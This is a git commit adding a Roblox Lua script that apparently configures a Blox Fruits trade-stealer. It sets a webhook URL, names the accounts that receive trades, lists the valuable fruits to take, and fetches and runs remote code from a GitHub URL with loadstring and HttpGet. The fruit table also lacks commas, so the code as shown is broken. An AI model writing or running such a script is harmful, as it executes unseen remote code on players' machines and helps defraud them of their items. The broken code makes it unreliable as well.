7cc2551b8755642d346f8299f1aae1b1c7c2284d
vovasevere200 <vovasevere@gmail.com>
2025-02-19 13:45:51 +0700

    Create unluck.lua

---
+++ unluck.lua
@@ -0,0 +1,14 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=TFA0VEpXaklsb1czZVY3L3psejFHdz09OmtaV3EwVER5bHpDSERmYUUxMDlmR0l0UlF1VmxSQnhhM3JWeVR2Vy8xQXhya2drNHIrMWMwa1MyNE5KWmRvb0dFa2FVdkRlK1pCUGlHMG1wanlKZUJkZjQ4cVBIMGcxQ3QzWU9RUGhUb3hyczBNZE0zb05BdjFDemF5WWxYOHRVWm1nMkRJWGpocXJrTEhCUE1ibnBjckpQL1Vpcm5mWFl3TXkyV1JLMDRDMD0%3D"
+Usernames = {"vovasevere1", "user2"} -- << Username(-s) it'll accept trade with
+Fruits = {"", "Venom-Venom", "Control-Control", "Gas-Gas", "Spirit-Spirit", "Leopard-Leopard", "Yeti-Yeti", "Dragon (East)-Dragon (East)", "Dragon (West)-Dragon (West)"} -- << Fruits you want
+FruitsToReset = {  -- << Fruits it'll reset with, so you can put these fruits in trade to counter value difference
+    "Quake-Quake",
+    "Love-Love",
+    "Magma-Magma",
+    "Ghost-Ghost",
+    "Barrier-Barrier"
+    "Pain-Pain"
+    "Spider-Spider"
+}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lelel22f/script/refs/heads/main/note"))()
